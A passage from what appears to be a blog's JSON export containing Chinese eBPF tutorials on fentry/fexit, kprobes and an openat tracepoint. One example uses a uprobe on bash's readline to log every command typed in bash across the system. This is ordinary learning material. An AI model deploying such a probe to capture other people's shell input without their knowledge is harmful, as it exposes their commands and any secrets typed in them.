mknodat&#x2F;sys_mknodatmknod(2) - Linux manual page (man7.org) namei.c - fs&#x2F;namei.c - Linux source code (v6.6.6) - Bootlin uselibuselib(2) - Linux manual page (man7.org) personality&#x2F;sys_personalitypersonality(2) - Linux manual page (man7.org) exec_domain.c - kernel&#x2F;exec_domain.c - Linux source code (v6.6.6) - Bootlin ustat&#x2F;sys_ustatustat(2) - Linux manual page (man7.org) statfs.c - fs&#x2F;statfs.c - Linux source code (v6.6.6) - Bootlin statfs&#x2F;sys_statfs | statfs64&#x2F;sys_statfs64 | fstatfs&#x2F;sys_fstatfs | fstatfs64&#x2F;sys_fstatfs64statfs(2) - Linux manual page (man7.org) statfs.c - fs&#x2F;statfs.c - Linux source code (v6.6.6) - Bootlin sysfs&#x2F;sys_sysfssysfs(2) - Linux manual page (man7.org) filesystems.c - fs&#x2F;filesystems.c - Linux source code (v6.6.6) - Bootlin getpriority&#x2F;sys_getpriority | setpriority&#x2F;sys_setprioritygetpriority(2) - Linux manual page (man7.org) sys.c - kernel&#x2F;sys.c - Linux source code (v6.6.6) - Bootlin sys.c - kernel&#x2F;sys.c - Linux source code (v6.6.6) - Bootlin sched_setparam&#x2F;sys_sched_setparam | sched_getparam&#x2F;sys_sched_getparamsched_setparam(2) - Linux manual page (man7.org) core.c - kernel&#x2F;sched&#x2F;core.c - Linux source code (v6.6.6) - Bootlin core.c - kernel&#x2F;sched&#x2F;core.c - Linux source code (v6.6.6) - Bootlin sched_setscheduler&#x2F;sys_sched_setscheduler | sched_getscheduler&#x2F;sys_sched_getschedulersched_setscheduler(2) - Linux manual page (man7.org) core.c - kernel&#x2F;sched&#x2F;core.c - Linux source code (v6.6.6) - Bootlin core.c - kernel&#x2F;sched&#x2F;core.c - Linux source code (v6.6.6) - Bootlin sched_get_priority_max&#x2F;sys_sched_get_priority_max | sched_get_priority_min&#x2F;sys_sched_get_priority_minsched_get_priority_max(2) - Linux manual page (man7.org) core.c - kernel&#x2F;sched&#x2F;core.c - Linux source code (v6.6.6) - Bootlin sched_rr_get_interval &#x2F;sys_sched_rr_get_intervalsched_rr_get_interval(2) - Linux manual page (man7.org) core.c - kernel&#x2F;sched&#x2F;core.c - Linux source code (v6.6.6) - Bootlin mlock&#x2F;sys_mlock | munlock&#x2F;sys_munlock | mlockall&#x2F;sys_mlockall | munlockall&#x2F;sys_munlockall | mlock2&#x2F;sys_mlcok2mlock(2) - Linux manual page (man7.org) mlock.c - mm&#x2F;mlock.c - Linux source code (v6.6.6) - Bootlin mlock.c - mm&#x2F;mlock.c - Linux source code (v6.6.6) - Bootlin modify_ldt&#x2F;sys_modify_ldtmodify_ldt(2) - Linux manual page (man7.org) ldt.c - arch&#x2F;x86&#x2F;kernel&#x2F;ldt.c - Linux source code (v6.6.6) - Bootlin pivot_root&#x2F;sys_pivot_rootpivot_root(2) - Linux manual page (man7.org) namespace.c - fs&#x2F;namespace.c - Linux source code (v6.6.6) - Bootlin _sysctl&#x2F;sys_ni_syscalllinux&#x2F;arch&#x2F;x86&#x2F;entry&#x2F;syscalls&#x2F;syscall_64.tbl at master · torvalds&#x2F;linux (github.com) prctl&#x2F;sys_prctlprctl(2) - Linux manual page (man7.org) sys.c - kernel&#x2F;sys.c - Linux source code (v6.6.6) - Bootlin arch_prctl&#x2F;sys_arch_prctlarch_prctl(2) - Linux manual page (man7.org) sys_arch_prctl identifier - Linux source code (v6.6.6) - Bootlin adjtimex&#x2F;sys_adjtimex | clock_adjtime&#x2F;sys_clock_adjtimeadjtimex(2) - Linux manual page (man7.org) time.c - kernel&#x2F;time&#x2F;time.c - Linux source code (v6.6.6) - Bootlin posix-timers.c - kernel&#x2F;time&#x2F;posix-timers.c - Linux source code (v6.6.6) - Bootlin chroot&#x2F;sys_chrootchroot(2) - Linux manual page (man7.org) open.c - fs&#x2F;open.c - Linux source code (v6.6.6) - Bootlin sync&#x2F;sys_sync | syncfs&#x2F;sys_syncfssync(2) - Linux manual page (man7.org) sync.c - fs&#x2F;sync.c - Linux source code (v6.6.6) - Bootlin sync.c - fs&#x2F;sync.c - Linux source code (v6.6.6) - Bootlin acct&#x2F;sys_acctacct(2) - Linux manual page (man7.org) acct.c - kernel&#x2F;acct.c - Linux source code (v6.6.6) - Bootlin mount&#x2F;sys_mountmount(2) - Linux manual page (man7.org) namespace.c - fs&#x2F;namespace.c - Linux source code (v6.6.6) - Bootlin umount&#x2F;sys_umountumount(8) - Linux manual page (man7.org) namespace.c - fs&#x2F;namespace.c - Linux source code (v6.6.6) - Bootlin swapon&#x2F;sys_swapon | swapoff&#x2F;sys_swapoffswapon(2) - Linux manual page (man7.org) swapfile.c - mm&#x2F;swapfile.c - Linux source code (v6.6.6) - Bootlin swapfile.c - mm&#x2F;swapfile.c - Linux source code (v6.6.6) - Bootlin reboot&#x2F;sys_rebootreboot(2) - Linux manual page (man7.org) reboot.c - kernel&#x2F;reboot.c - Linux source code (v6.6.6) - Bootlin sethostname&#x2F;sys_sethostname | gethostname&#x2F;sys_gethostnamegethostname(2) - Linux manual page (man7.org) sys.c - kernel&#x2F;sys.c - Linux source code (v6.6.6) - Bootlin sys.c - kernel&#x2F;sys.c - Linux source code (v6.6.6) - Bootlin setdomainname&#x2F;sys_setdomainname | getdomainname&#x2F;sys_getdomainnamegetdomainname(2) - Linux manual page (man7.org) sys.c - kernel&#x2F;sys.c - Linux source code (v6.6.6) - Bootlin sys_sparc_64.c - arch&#x2F;sparc&#x2F;kernel&#x2F;sys_sparc_64.c - Linux source code (v6.6.6) - Bootlin iopl&#x2F;sys_iopliopl(2) - Linux manual page (man7.org) ioport.c - arch&#x2F;x86&#x2F;kernel&#x2F;ioport.c - Linux source code (v6.6.6) - Bootlin iopermm&#x2F;sys_iopermioperm(2) - Linux manual page (man7.org) ioport.c - arch&#x2F;x86&#x2F;kernel&#x2F;ioport.c - Linux source code (v6.6.6) - Bootlin","categories":[{"name":"Linux内核","slug":"Linux内核","permalink":"http://example.com/categories/Linux%E5%86%85%E6%A0%B8/"}],"tags":[{"name":"Linux","slug":"Linux","permalink":"http://example.com/tags/Linux/"}]},{"title":"eBPF 学习 入门开发实践","slug":"eBPF-学习-入门开发实践","date":"2023-12-11T08:44:22.000Z","updated":"2023-12-15T06:58:19.050Z","comments":true,"path":"2023/12/11/eBPF-学习-入门开发实践/","link":"","permalink":"http://example.com/2023/12/11/eBPF-%E5%AD%A6%E4%B9%A0-%E5%85%A5%E9%97%A8%E5%BC%80%E5%8F%91%E5%AE%9E%E8%B7%B5/","excerpt":"eunomia-bpf: Simplifying and enhancing eBPF development and deployment - eunomia 转载，记录学习此教程 在 eBPF 中使用 fentry 监测捕获 unlink 系统调用","text":"eunomia-bpf: Simplifying and enhancing eBPF development and deployment - eunomia 转载，记录学习此教程 在 eBPF 中使用 fentry 监测捕获 unlink 系统调用Fentryfentry（function entry）和 fexit（function exit）是 eBPF（扩展的伯克利包过滤器）中的两种探针类型，用于在 Linux 内核函数的入口和退出处进行跟踪。它们允许开发者在内核函数执行的特定阶段收集信息、修改参数或观察返回值。这种跟踪和监控功能在性能分析、故障排查和安全分析等场景中非常有用。 与 kprobes 相比，fentry 和 fexit 程序有更高的性能和可用性。在这个例子中，我们可以直接访问函数的指针参数，就像在普通的 C 代码中一样，而不需要使用各种读取帮助程序。fexit 和 kretprobe 程序最大的区别在于，fexit 程序可以访问函数的输入参数和返回值，而 kretprobe 只能访问返回值。从 5.5 内核开始，fentry 和 fexit 对 eBPF 程序可用。 代码12345678910111213141516171819202122232425#include &quot;vmlinux.h&quot;#include &lt;bpf/bpf_helpers.h&gt;#include &lt;bpf/bpf_tracing.h&gt;char LICENSE[] SEC(&quot;license&quot;) = &quot;Dual BSD/GPL&quot;;SEC(&quot;fentry/do_unlinkat&quot;)int BPF_PROG(do_unlinkat, int dfd, struct filename *name)&#123; pid_t pid; pid = bpf_get_current_pid_tgid() &gt;&gt; 32; bpf_printk(&quot;fentry: pid = %d, filename = %s\\n&quot;, pid, name-&gt;name); return 0;&#125;SEC(&quot;fexit/do_unlinkat&quot;)int BPF_PROG(do_unlinkat_exit, int dfd, struct filename *name, long ret)&#123; pid_t pid; pid = bpf_get_current_pid_tgid() &gt;&gt; 32; bpf_printk(&quot;fexit: pid = %d, filename = %s, ret = %ld\\n&quot;, pid, name-&gt;name, ret); return 0;&#125; 这段程序是用 C 语言编写的 eBPF（扩展的伯克利包过滤器）程序，它使用 BPF 的 fentry 和 fexit 探针来跟踪 Linux 内核函数 do_unlinkat。在这个教程中，我们将以这段程序作为示例，让您学会如何在 eBPF 中使用 fentry 监测捕获 unlink 系统调用。 程序包含以下部分： 包含头文件：包括 vmlinux.h（用于访问内核数据结构）、bpf&#x2F;bpf_helpers.h（包含eBPF帮助函数）、bpf&#x2F;bpf_tracing.h（用于eBPF跟踪相关功能）。 定义许可证：这里定义了一个名为 LICENSE 的字符数组，包含许可证信息“Dual BSD&#x2F;GPL”。 定义 fentry 探针：我们定义了一个名为 BPF_PROG(do_unlinkat) 的 fentry 探针，该探针在 do_unlinkat 函数的入口处被触发。这个探针获取当前进程的 PID（进程ID）并将其与文件名一起打印到内核日志。 使用 bpf_get_current_pid_tgid 和 bpf_printk 函数获取调用 do_unlinkat 的进程的 ID、文件名和返回值，并在内核日志中打印出来。 定义 fexit 探针：我们还定义了一个名为 BPF_PROG(do_unlinkat_exit) 的 fexit 探针，该探针在 do_unlinkat 函数的退出处被触发。与 fentry 探针类似，这个探针也会获取当前进程的 PID 并将其与文件名和返回值一起打印到内核日志。 编译运行上述代码 1ecc fentry-link.bpf.c 1sudo ecli run package.json 在另一个窗口中 1234touch test_filerm test_filetouch test_file2rm test_file2 运行这段程序后，可以通过查看 /sys/kernel/debug/tracing/trace_pipe 文件来查看 eBPF 程序的输出 1sudo cat /sys/kernel/debug/tracing/trace_pipe 结果如下： rm-9648 [000] d..21 6939.311202: bpf_trace_printk: fentry: pid &#x3D; 9648, filename &#x3D; test_file rm-9648 [000] d..21 6939.311323: bpf_trace_printk: fexit: pid = 9648, filename = test_file, ret = 0 rm-9650 [002] d..21 6939.319099: bpf_trace_printk: fentry: pid = 9650, filename = test_file2 rm-9650 [002] d..21 6939.319204: bpf_trace_printk: fexit: pid = 9650, filename = test_file2, ret = 0 在 eBPF 中捕获进程打开文件的系统调用集合，使用全局变量过滤进程 pid在 Linux 系统中，进程与文件之间的交互是通过系统调用来实现的。系统调用是用户态程序与内核态程序之间的接口，它们允许用户态程序请求内核执行特定操作。我们关注的是 sys_openat 系统调用，它用于打开文件。 当进程打开一个文件时，它会向内核发出 sys_openat 系统调用，并传递相关参数（例如文件路径、打开模式等）。内核会处理这个请求，并返回一个文件描述符（file descriptor），这个描述符将在后续的文件操作中用作引用。通过捕获 sys_openat 系统调用，我们可以了解进程在什么时候以及如何打开文件。 123456789101112131415161718192021#include &lt;vmlinux.h&gt;#include &lt;bpf/bpf_helpers.h&gt;/// @description &quot;Process ID to trace&quot;const volatile int pid_target = 0;SEC(&quot;tracepoint/syscalls/sys_enter_openat&quot;)int tracepoint__syscalls__sys_enter_openat(struct trace_event_raw_sys_enter* ctx)&#123; u64 id = bpf_get_current_pid_tgid(); u32 pid = id &gt;&gt; 32; if (pid_target &amp;&amp; pid_target != pid) return false; // Use bpf_printk to print the process information bpf_printk(&quot;Process ID: %d enter sys openat\\n&quot;, pid); return 0;&#125;/// &quot;Trace open family syscalls.&quot;char LICENSE[] SEC(&quot;license&quot;) = &quot;GPL&quot;; 这段 eBPF 程序实现了： 引入头文件： 包含了内核数据结构的定义， 包含了 eBPF 程序所需的辅助函数。 定义全局变量 pid_target，用于过滤指定进程 ID。这里设为 0 表示捕获所有进程的 sys_openat 调用。 使用 SEC 宏定义一个 eBPF 程序，关联到 tracepoint “tracepoint&#x2F;syscalls&#x2F;sys_enter_openat”。这个 tracepoint 会在进程发起 sys_openat 系统调用时触发。 实现 eBPF 程序 tracepoint__syscalls__sys_enter_openat，它接收一个类型为 struct trace_event_raw_sys_enter 的参数 ctx。这个结构体包含了关于系统调用的信息。 使用 bpf_get_current_pid_tgid() 函数获取当前进程的 PID 和 TID（线程 ID）。由于我们只关心 PID，所以将其值右移 32 位赋值给 u32 类型的变量 pid。 检查 pid_target 变量是否与当前进程的 pid 相等。如果 pid_target 不为 0 且与当前进程的 pid 不相等，则返回 false，不对该进程的 sys_openat 调用进行捕获。 使用 bpf_printk() 函数打印捕获到的进程 ID 和 sys_openat 调用的相关信息。这些信息可以在用户空间通过 BPF 工具查看。 将程序许可证设置为 “GPL”，这是运行 eBPF 程序的必要条件。 这个 eBPF 程序可以通过 libbpf 或 eunomia-bpf 等工具加载到内核并执行。它将捕获指定进程（或所有进程）的 sys_openat 系统调用，并在用户空间输出相关信息。 编译运行上述代码 1ecc opensnoop.bpf.c 1sudo ecli run package.json 运行这段程序后，可以通过查看 /sys/kernel/debug/tracing/trace_pipe 文件来查看 eBPF 程序的输出 1sudo cat /sys/kernel/debug/tracing/trace_pipe 运行结果如下 systemd-oomd-837 [003] d..31 7527.833623: bpf_trace_printk: Process ID: 837 enter sys openat systemd-oomd-837 [003] d..31 7527.833685: bpf_trace_printk: Process ID: 837 enter sys openat systemd-oomd-837 [003] d..31 7527.833741: bpf_trace_printk: Process ID: 837 enter sys openat systemd-oomd-837 [003] d..31 7527.833798: bpf_trace_printk: Process ID: 837 enter sys openat systemd-oomd-837 [003] d..31 7527.834180: bpf_trace_printk: Process ID: 837 enter sys openat node-4070 [001] d..31 7527.938561: bpf_trace_printk: Process ID: 4070 enter sys openat node-4070 [001] d..31 7528.032286: bpf_trace_printk: Process ID: 4070 enter sys openat systemd-oomd-837 [003] d..31 7528.083291: bpf_trace_printk: Process ID: 837 enter sys openat node-4070 [001] d..31 7528.139436: bpf_trace_printk: Process ID: 4070 enter sys openat 使用全局变量在 eBPF 中过滤进程 pid全局变量在 eBPF 程序中充当一种数据共享机制，它们允许用户态程序与 eBPF 程序之间进行数据交互。这在过滤特定条件或修改 eBPF 程序行为时非常有用。这种设计使得用户态程序能够在运行时动态地控制 eBPF 程序的行为。 在我们的例子中，全局变量 pid_target 用于过滤进程 PID。用户态程序可以设置此变量的值，以便在 eBPF 程序中只捕获与指定 PID 相关的 sys_openat 系统调用。 使用全局变量的原理是，全局变量在 eBPF 程序的数据段（data section）中定义并存储。当 eBPF 程序加载到内核并执行时，这些全局变量会保持在内核中，可以通过 BPF 系统调用进行访问。用户态程序可以使用 BPF 系统调用中的某些特性，如 bpf_obj_get_info_by_fd 和 bpf_obj_get_info，获取 eBPF 对象的信息，包括全局变量的位置和值。 可以通过执行 ecli -h 命令来查看 opensnoop 的帮助信息： 1ecli package.json -h ecli subcommands, including run, push, pull Usage: ecli [PROG] [EXTRA_ARGS]… [COMMAND] Commands: run run ebpf program client Client operations push Operations about pushing image to registry pull Operations about pulling image from registry help Print this message or the help of the given subcommand(s) Arguments: [PROG] Not preferred. Only for compatibility to older versions. Ebpf program URL or local path, set it - to read the program from stdin [EXTRA_ARGS]… Not preferred. Only for compatibility to older versions. Extra args to the program; For wasm program, it will be passed directly to it; For JSON program, it will be passed to the generated argument parser Options: -h, –help Print help 1sudo ../ecli package.json -- --pid_target 1 运行这段程序之后查看/sys/kernel/debug/tracing/trace_pipe 结果如下 systemd-1 [000] d..31 8535.716974: bpf_trace_printk: Process ID: 1 enter sys openat systemd-1 [000] d..31 8535.717130: bpf_trace_printk: Process ID: 1 enter sys openat systemd-1 [000] d..31 8535.717193: bpf_trace_printk: Process ID: 1 enter sys openat systemd-1 [000] d..31 8535.717262: bpf_trace_printk: Process ID: 1 enter sys openat systemd-1 [000] d..31 8563.312586: bpf_trace_printk: Process ID: 1 enter sys openat 可以看到只过滤了PID为1的进程 uprobe 捕获 bash 的 readline 函数调用什么是uprobeuprobe是一种用户空间探针，uprobe探针允许在用户空间程序中动态插桩，插桩位置包括：函数入口、特定偏移处，以及函数返回处。当我们定义uprobe时，内核会在附加的指令上创建快速断点指令（x86机器上为int3指令），当程序执行到该指令时，内核将触发事件，程序陷入到内核态，并以回调函数的方式调用探针函数，执行完探针函数再返回到用户态继续执行后序的指令。 uprobe基于文件，当一个二进制文件中的一个函数被跟踪时，所有使用到这个文件的进程都会被插桩，包括那些尚未启动的进程，这样就可以在全系统范围内跟踪系统调用。 uprobe适用于在用户态去解析一些内核态探针无法解析的流量，例如http2流量（报文header被编码，内核无法解码），https流量（加密流量，内核无法解密）。 使用 uprobe 捕获 bash 的 readline 函数调用uprobe 是一种用于捕获用户空间函数调用的 eBPF 的探针，我们可以通过它来捕获用户空间程序调用的系统函数。 例如，我们可以使用 uprobe 来捕获 bash 的 readline 函数调用，从而获取用户在 bash 中输入的命令行。示例代码如下： 1234567891011121314151617181920212223242526272829303132333435363738#include &lt;vmlinux.h&gt;#include &lt;bpf/bpf_helpers.h&gt;#include &lt;bpf/bpf_tracing.h&gt;#define TASK_COMM_LEN 16#define MAX_LINE_SIZE 80/* Format of u[ret]probe section definition supporting auto-attach: * u[ret]probe/binary:function[+offset] * * binary can be an absolute/relative path or a filename; the latter is resolved to a * full binary path via bpf_program__attach_uprobe_opts. * * Specifying uprobe+ ensures we carry out strict matching; either &quot;uprobe&quot; must be * specified (and auto-attach is not possible) or the above format is specified for * auto-attach. */SEC(&quot;uretprobe//bin/bash:readline&quot;)int BPF_KRETPROBE(printret, const void *ret)&#123; char str[MAX_LINE_SIZE]; char comm[TASK_COMM_LEN]; u32 pid; if (!ret) return 0; bpf_get_current_comm(&amp;comm, sizeof(comm)); pid = bpf_get_current_pid_tgid() &gt;&gt; 32; bpf_probe_read_user_str(str, sizeof(str), ret); bpf_printk(&quot;PID %d (%s) read: %s &quot;, pid, comm, str); return 0;&#125;;char LICENSE[] SEC(&quot;license&quot;) = &quot;GPL&quot;; 这段代码的作用是在 bash 的 readline 函数返回时执行指定的 BPF_KRETPROBE 函数，即 printret 函数。 在 printret 函数中，我们首先获取了调用 readline 函数的进程的进程名称和进程 ID，然后通过 bpf_probe_read_user_str 函数读取了用户输入的命令行字符串，最后通过 bpf_printk 函数打印出进程 ID、进程名称和输入的命令行字符串。 除此之外，我们还需要通过 SEC 宏来定义 uprobe 探针，并使用 BPF_KRETPROBE 宏来定义探针函数。 在 SEC 宏中，我们需要指定 uprobe 的类型、要捕获的二进制文件的路径和要捕获的函数名称。例如，上面的代码中的 SEC 宏的定义如下： 1SEC(&quot;uprobe//bin/bash:readline&quot;) 这表示我们要捕获的是 &#x2F;bin&#x2F;bash 二进制文件中的 readline 函数。 接下来，我们需要使用 BPF_KRETPROBE 宏来定义探针函数，例如： 1BPF_KRETPROBE(printret, const void *ret) 这里的 printret 是探针函数的名称，const void *ret 是探针函数的参数，它代表被捕获的函数的返回值。 然后，我们使用了 bpf_get_current_comm 函数获取当前任务的名称，并将其存储在 comm 数组中。 1bpf_get_current_comm(&amp;comm, sizeof(comm)); 使用 bpf_get_current_pid_tgid 函数获取当前进程的 PID，并将其存储在 pid 变量中。 1pid = bpf_get_current_pid_tgid() &gt;&gt; 32; 使用 bpf_probe_read_user_str 函数从用户空间读取 readline 函数的返回值，并将其存储在 str 数组中。 1bpf_probe_read_user_str(str, sizeof(str), ret); 最后使用 bpf_printk 函数输出 PID、任务名称和用户输入的字符串。 1bpf_printk(&quot;PID %d (%s) read: %s &quot;, pid, comm, str); 编译运行以上代码 1ecc bashreadline.bpf.c 1ecli run package.json 1sudo cat /sys/kernel/debug/tracing/trace_pipe 打开另一个终端随便运行一个ls命令，可以看到文件的输出 1&lt;...&gt;-11864 [014] d..21 9263.415769: bpf_trace_printk: PID 11864 (bash) read: ls 捕获进程发送信号的系统调用集合，使用 hash map 保存状态","categories":[],"tags":[]},{"title":"eBPF 学习 kprobes及监听unlink系统调用","slug":"eBPF-学习-kprobes及监听unlink系统调用","date":"2023-12-11T07:44:45.000Z","updated":"2023-12-15T06:58:00.433Z","comments":true,"path":"2023/12/11/eBPF-学习-kprobes及监听unlink系统调用/","link":"","permalink":"http://example.com/2023/12/11/eBPF-%E5%AD%A6%E4%B9%A0-kprobes%E5%8F%8A%E7%9B%91%E5%90%ACunlink%E7%B3%BB%E7%BB%9F%E8%B0%83%E7%94%A8/","excerpt":"Tracepoint跟踪点（tracepoints）是内核静态插桩技术，在技术上只是放置在内核源代码中的跟踪函数，实际上就是在源码中插入的一些带有控制条件的探测点，这些探测点允许事后再添加处理函数。比如在内核中，最常见的静态跟踪方法就是 printk，即输出日志。又比如：在系统调用、调度程序事件、文件系统操作和磁盘 I&#x2F;O 的开始和结束时都有跟踪点。跟踪点于 2009 年在 Linux 2.6.32 版本中首次提供。跟踪点是一种稳定的 API，数量有限。 kprobes","text":"Tracepoint跟踪点（tracepoints）是内核静态插桩技术，在技术上只是放置在内核源代码中的跟踪函数，实际上就是在源码中插入的一些带有控制条件的探测点，这些探测点允许事后再添加处理函数。比如在内核中，最常见的静态跟踪方法就是 printk，即输出日志。又比如：在系统调用、调度程序事件、文件系统操作和磁盘 I&#x2F;O 的开始和结束时都有跟踪点。跟踪点于 2009 年在 Linux 2.6.32 版本中首次提供。跟踪点是一种稳定的 API，数量有限。 kprobes如果需要知道内核函数是否被调用、被调用上下文、入参以及返回值，比较简单的方法是加printk，但是效率低，因为要重新编译。 在调试中可以通过两种方式使用kprobe： 第一种是编写内核模块，向内核注册探测点，探测函数根据需要自行定制，但是使用不方便； 第二种是使用kprobes in ftrace，这种方式结合kprobe和ftrace，可以通过kprobe来优化ftrace跟踪函数。 首先kprobe是最基本的探测方式，是实现后两种的基础，它可以在任意的位置放置探测点（就连函数内部的某条指令处也可以），它提供了探测点的调用前、调用后和内存访问出错3种回调方式，分别是pre_handler、post_handler和fault_handler，其中pre_handler函数将在被探测指令被执行前回调，post_handler会在被探测指令执行完毕后回调（注意不是被探测函数），fault_handler会在内存访问出错时被调用；jprobe基于kprobe实现，它用于获取被探测函数的入参值；最后kretprobe从名字种就可以看出其用途了，它同样基于kprobe实现，用于获取被探测函数的返回值。 开发人员在内核或者模块的调试过程中，往往会需要要知道其中的一些函数有无被调用、何时被调用、执行是否正确以及函数的入参和返回值是什么等等。比较简单的做法是在内核代码对应的函数中添加日志打印信息，但这种方式往往需要重新编译内核或模块，重新启动设备之类的，操作较为复杂甚至可能会破坏原有的代码执行过程。 而利用 kprobes 技术，用户可以定义自己的回调函数，然后在内核或者模块中几乎所有的函数中（有些函数是不可探测的，例如kprobes自身的相关实现函数，后文会有详细说明）动态地插入探测点，当内核执行流程执行到指定的探测函数时，会调用该回调函数，用户即可收集所需的信息了，同时内核最后还会回到原本的正常执行流程。如果用户已经收集足够的信息，不再需要继续探测，则同样可以动态地移除探测点。因此 kprobes 技术具有对内核执行流程影响小和操作方便的优点。 kprobes 技术包括的3种探测手段分别时 kprobe、jprobe 和 kretprobe。首先 kprobe 是最基本的探测方式，是实现后两种的基础，它可以在任意的位置放置探测点（就连函数内部的某条指令处也可以），它提供了探测点的调用前、调用后和内存访问出错3种回调方式，分别是 pre_handler、post_handler 和 fault_handler，其中 pre_handler 函数将在被探测指令被执行前回调，post_handler 会在被探测指令执行完毕后回调（注意不是被探测函数），fault_handler 会在内存访问出错时被调用；jprobe 基于 kprobe 实现，它用于获取被探测函数的入参值；最后 kretprobe 从名字中就可以看出其用途了，它同样基于 kprobe 实现，用于获取被探测函数的返回值。 kprobes 的技术原理并不仅仅包含纯软件的实现方案，它也需要硬件架构提供支持。其中涉及硬件架构相关的是 CPU 的异常处理和单步调试技术，前者用于让程序的执行流程陷入到用户注册的回调函数中去，而后者则用于单步执行被探测点指令，因此并不是所有的架构均支持 kprobes。目前 kprobes 技术已经支持多种架构，包括 i386、x86_64、ppc64、ia64、sparc64、arm、ppc 和 mips（有些架构实现可能并不完全，具体可参考内核的 Documentation&#x2F;kprobes.txt）。 使用特点与限制kprobes 的特点与使用限制： kprobes 允许在同一个被探测位置注册多个 kprobe，但是目前 jprobe 却不可以；同时也不允许以其他的 jprobe 回调函数和 kprobe 的 post_handler 回调函数作为被探测点。 一般情况下，可以探测内核中的任何函数，包括中断处理函数。不过在 kernel&#x2F;kprobes.c 和 arch&#x2F;*&#x2F;kernel&#x2F;kprobes.c 程序中用于实现 kprobes 自身的函数是不允许被探测的，另外还有do_page_fault 和 notifier_call_chain； 如果以一个内联函数为探测点，则 kprobes 可能无法保证对该函数的所有实例都注册探测点。由于 gcc 可能会自动将某些函数优化为内联函数，因此可能无法达到用户预期的探测效果； 一个探测点的回调函数可能会修改被探测函数的运行上下文，例如通过修改内核的数据结构或者保存与struct pt_regs结构体中的触发探测器之前寄存器信息。因此 kprobes 可以被用来安装 bug 修复代码或者注入故障测试代码； kprobes 会避免在处理探测点函数时再次调用另一个探测点的回调函数，例如在printk()函数上注册了探测点，而在它的回调函数中可能会再次调用printk函数，此时将不再触发printk探测点的回调，仅仅是增加了kprobe结构体中nmissed字段的数值； 在 kprobes 的注册和注销过程中不会使用 mutex 锁和动态的申请内存； kprobes 回调函数的运行期间是关闭内核抢占的，同时也可能在关闭中断的情况下执行，具体要视CPU架构而定。因此不论在何种情况下，在回调函数中不要调用会放弃 CPU 的函数（如信号量、mutex 锁等）； kretprobe 通过替换返回地址为预定义的 trampoline 的地址来实现，因此栈回溯和 gcc 内嵌函数__builtin_return_address()调用将返回 trampoline 的地址而不是真正的被探测函数的返回地址； 如果一个函数的调用次数和返回次数不相等，则在类似这样的函数上注册 kretprobe 将可能不会达到预期的效果，例如do_exit()函数会存在问题，而do_execve()函数和do_fork()函数不会； 当在进入和退出一个函数时，如果 CPU 运行在非当前任务所有的栈上，那么往该函数上注册 kretprobe 可能会导致不可预料的后果，因此，kprobes 不支持在 X86_64 的结构下为__switch_to()函数注册 kretprobe，将直接返回-EINVAL。 eBPF的kprobe示例12345678910111213141516171819202122232425262728#include &quot;vmlinux.h&quot;#include &lt;bpf/bpf_helpers.h&gt;#include &lt;bpf/bpf_tracing.h&gt;#include &lt;bpf/bpf_core_read.h&gt;char LICENSE[] SEC(&quot;license&quot;) = &quot;Dual BSD/GPL&quot;;SEC(&quot;kprobe/do_unlinkat&quot;)int BPF_KPROBE(do_unlinkat, int dfd, struct filename *name)&#123; pid_t pid; const char *filename; pid = bpf_get_current_pid_tgid() &gt;&gt; 32; filename = BPF_CORE_READ(name, name); bpf_printk(&quot;KPROBE ENTRY pid = %d, filename = %s\\n&quot;, pid, filename); return 0;&#125;SEC(&quot;kretprobe/do_unlinkat&quot;)int BPF_KRETPROBE(do_unlinkat_exit, long ret)&#123; pid_t pid; pid = bpf_get_current_pid_tgid() &gt;&gt; 32; bpf_printk(&quot;KPROBE EXIT: pid = %d, ret = %ld\\n&quot;, pid, ret); return 0;&#125; 编译运行 1ecc kprobe-link.bpf.c 1sudo ecli run package.json 1234touch test1rm test1touch test2rm test2 1sudo cat /sys/kernel/debug/tracing/trace_pipe 应该可以看到如下输出： rm-8879 [012] d..31 4264.198611: bpf_trace_printk: KPROBE ENTRY pid &#x3D; 8879, filename &#x3D; test1 rm-8879 [012] d..31 4264.198718: bpf_trace_printk: KPROBE EXIT: pid = 8879, ret = 0 rm-8881 [012] d..31 4264.206302: bpf_trace_printk: KPROBE ENTRY pid = 8881, filename = test2 rm-8881 [012] d..31 4264.206380: bpf_trace_printk: KPROBE EXIT: pid = 8881, ret = 0 代码分析 首先，我们导入必要的头文件，如 vmlinux.h，bpf_helpers.h，bpf_tracing.h 和 bpf_core_read.h。接着，我们定义许可证，以允许程序在内核中运行。 123456#include &quot;vmlinux.h&quot;#include &lt;bpf/bpf_helpers.h&gt;#include &lt;bpf/bpf_tracing.h&gt;#include &lt;bpf/bpf_core_read.h&gt;char LICENSE[] SEC(&quot;license&quot;) = &quot;Dual BSD/GPL&quot;; 接下来，我们定义一个名为BPF_KPROBE(do_unlinkat)的 kprobe，当进入do_unlinkat函数时，它会被触发。该函数接受两个参数：dfd（文件描述符）和name（文件名结构体指针）。在这个 kprobe 中，我们获取当前进程的 PID（进程标识符），然后读取文件名。最后，我们使用bpf_printk函数在内核日志中打印 PID 和文件名。 1234567891011SEC(&quot;kprobe/do_unlinkat&quot;)int BPF_KPROBE(do_unlinkat, int dfd, struct filename *name)&#123; pid_t pid; const char *filename; pid = bpf_get_current_pid_tgid() &gt;&gt; 32; filename = BPF_CORE_READ(name, name); bpf_printk(&quot;KPROBE ENTRY pid = %d, filename = %s\\n&quot;, pid, filename); return 0;&#125; 接下来，我们定义一个名为BPF_KRETPROBE(do_unlinkat_exit)的 kretprobe，当从do_unlinkat函数退出时，它会被触发。这个 kretprobe 的目的是捕获函数的返回值（ret）。我们再次获取当前进程的 PID，并使用bpf_printk函数在内核日志中打印 PID 和返回值。 123456789SEC(&quot;kretprobe/do_unlinkat&quot;)int BPF_KRETPROBE(do_unlinkat_exit, long ret)&#123; pid_t pid; pid = bpf_get_current_pid_tgid() &gt;&gt; 32; bpf_printk(&quot;KPROBE EXIT: pid = %d, ret = %ld\\n&quot;, pid, ret); return 0;&#125; 参考资料bpf-developer-tutorial&#x2F;src&#x2F;2-kprobe-unlink&#x2F;README.md at main · eunomia-bpf&#x2F;bpf-developer-tutorial (github.com)","categories":[{"name":"Linux内核","slug":"Linux内核","permalink":"http://example.com/categories/Linux%E5%86%85%E6%A0%B8/"},{"name":"eBPF","slug":"Linux内核/eBPF","permalink":"http://example.com/categories/Linux%E5%86%85%E6%A0%B8/eBPF/"}],"tags":[{"name":"Linux","slug":"Linux","permalink":"http://example.com/tags/Linux/"},{"name":"eBPF","slug":"eBPF","permalink":"http://example.com/tags/eBPF/"}]},{"title":"eBPF 学习 